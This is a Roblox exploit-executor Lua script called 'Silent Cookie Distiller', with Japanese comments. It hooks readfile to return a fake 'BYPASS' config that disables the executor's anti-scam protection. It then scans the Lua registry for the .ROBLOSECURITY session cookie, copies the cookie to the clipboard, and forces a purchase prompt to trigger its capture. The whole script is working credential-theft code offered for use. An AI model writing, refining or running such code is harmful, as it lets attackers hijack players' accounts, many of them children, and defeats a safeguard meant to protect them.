-- [[ Project: Silent Cookie Distiller - Debug/Final ]]
-- ログが出るか、MarketplaceServiceが動くかだけに集中した構成

print("[DEBUG] Script Started") -- これすら出ない場合はDeltaの貼り付けミス

local player = game:GetService("Players").LocalPlayer
local MS = cloneref(game:GetService("MarketplaceService"))

-- STEP 1: セキュリティ偽装 (hookfunctionを使用)
pcall(function()
    local old_read
    old_read = hookfunction(readfile, function(path)
        if string.find(path:lower(), "disableantiscam") then
            return '{"WARNING":"BYPASS","allowed_games":"*","user_id":"'..tostring(player.UserId)..'","version_num":707}'
        end
        return old_read(path)
    end)
    print("[DEBUG] Hook Applied")
end)

-- STEP 2: クッキー監視 (getregを使用：GCより確実な場合がある)
task.spawn(function()
    print("[DEBUG] Scanning Registry...")
    local prefix = "_|WARNING:-DO-NOT-SHARE-"
    
    while true do
        -- getreg() は Lua のレジストリをすべて覗く。より深い場所まで探せる。
        for _, v in pairs(getreg()) do
            if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
                local _, pos = string.find(v, "|_", 1, true)
                if pos then
                    setclipboard(string.sub(v, pos + 1))
                    print("********************************")
                    print("SUCCESS: Captured to clipboard!")
                    print("********************************")
                    return 
                end
            end
        end
        task.wait(4)
    end
end)

-- STEP 3: 強制トリガー
task.wait(2)
print("[DEBUG] Opening UI...")
pcall(function()
    -- 確実に購入UIが出るはずのメソッド
    MS:PromptProductPurchase(player, 9999) 
end)
